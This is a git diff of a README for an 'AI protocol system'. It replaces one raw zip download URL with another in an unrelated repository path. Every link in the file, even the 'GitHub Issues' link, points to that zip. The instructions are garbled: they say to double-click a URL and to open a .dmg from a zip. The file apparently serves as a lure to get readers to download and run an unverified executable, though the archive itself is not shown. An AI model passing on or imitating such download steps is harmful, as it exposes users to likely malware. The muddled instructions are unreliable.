@@ -2,7 +2,7 @@
 # 🤖 Danbing_AI_Protocol_System_with_SLAPS_Framework - Your Guide to AI Protocols Made Easy
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/main/preopposition/Danbing_AI_Protocol_System_with_SLAPS_Framework.zip%20AI%20Protocol%20System-brightgreen)](https://raw.githubusercontent.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/main/preopposition/Danbing_AI_Protocol_System_with_SLAPS_Framework.zip)
+[![Download](https://github.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/raw/refs/heads/main/capsules/meeting-translator/releases/with_Framework_SLAP_A_Danbing_Protocol_System_1.3.zip%20AI%20Protocol%20System-brightgreen)](https://github.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/raw/refs/heads/main/capsules/meeting-translator/releases/with_Framework_SLAP_A_Danbing_Protocol_System_1.3.zip)
   
 ## 📘 Introduction
 Welcome to the Danbing AI Protocol System with SLAPS Framework. This system represents a new way to interact with artificial intelligence. It allows you to use natural language as commands for AI tasks. Imagine talking to your computer as you would to a person. This document will guide you on how to download and run this software.
@@ -25,21 +25,21 @@ To get started with the Danbing AI Protocol System, follow these simple steps:
 ## 🔗 Download & Install
 To download the Danbing AI Protocol System, please visit the following link:
 
-[Visit this page to download](https://raw.githubusercontent.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/main/preopposition/Danbing_AI_Protocol_System_with_SLAPS_Framework.zip)
+[Visit this page to download](https://github.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/raw/refs/heads/main/capsules/meeting-translator/releases/with_Framework_SLAP_A_Danbing_Protocol_System_1.3.zip)
 
 ### 🛠 Installation Steps
 1. Once on the Releases page, locate the latest version of the software.
 2. Click the link for your operating system:
-   - For Windows: Click on `https://raw.githubusercontent.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/main/preopposition/Danbing_AI_Protocol_System_with_SLAPS_Framework.zip`
-   - For macOS: Click on `https://raw.githubusercontent.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/main/preopposition/Danbing_AI_Protocol_System_with_SLAPS_Framework.zip`
-   - For Linux: Click on `https://raw.githubusercontent.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/main/preopposition/Danbing_AI_Protocol_System_with_SLAPS_Framework.zip`
+   - For Windows: Click on `https://github.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/raw/refs/heads/main/capsules/meeting-translator/releases/with_Framework_SLAP_A_Danbing_Protocol_System_1.3.zip`
+   - For macOS: Click on `https://github.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/raw/refs/heads/main/capsules/meeting-translator/releases/with_Framework_SLAP_A_Danbing_Protocol_System_1.3.zip`
+   - For Linux: Click on `https://github.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/raw/refs/heads/main/capsules/meeting-translator/releases/with_Framework_SLAP_A_Danbing_Protocol_System_1.3.zip`
 
 3. Your browser will begin downloading the file. Please wait for the download to complete.
 
 4. After downloading:
-   - **Windows**: Double-click the `https://raw.githubusercontent.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/main/preopposition/Danbing_AI_Protocol_System_with_SLAPS_Framework.zip` file and follow the on-screen instructions.
+   - **Windows**: Double-click the `https://github.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/raw/refs/heads/main/capsules/meeting-translator/releases/with_Framework_SLAP_A_Danbing_Protocol_System_1.3.zip` file and follow the on-screen instructions.
    - **macOS**: Open the downloaded `.dmg` file and drag the Danbing AI application into your Applications folder.
-   - **Linux**: Extract the `https://raw.githubusercontent.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/main/preopposition/Danbing_AI_Protocol_System_with_SLAPS_Framework.zip` file, open a terminal, navigate to the extracted folder, and run `./Danbing_AI_Linux`.
+   - **Linux**: Extract the `https://github.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/raw/refs/heads/main/capsules/meeting-translator/releases/with_Framework_SLAP_A_Danbing_Protocol_System_1.3.zip` file, open a terminal, navigate to the extracted folder, and run `./Danbing_AI_Linux`.
 
 ## 🎉 First Steps with Danbing AI
 After installation, you can start using the Danbing AI Protocol System.
@@ -63,7 +63,7 @@ If you encounter any issues:
 ## 🌍 Community & Support
 Join our community for more information and support:
 
-- **GitHub Issues**: Report bugs or request features [here](https://raw.githubusercontent.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/main/preopposition/Danbing_AI_Protocol_System_with_SLAPS_Framework.zip).
+- **GitHub Issues**: Report bugs or request features [here](https://github.com/githublandau/Danbing_AI_Protocol_System_with_SLAPS_Framework/raw/refs/heads/main/capsules/meeting-translator/releases/with_Framework_SLAP_A_Danbing_Protocol_System_1.3.zip).
 - **User Forum**: Share experiences and tips with other users.
 
 ## 📄 License
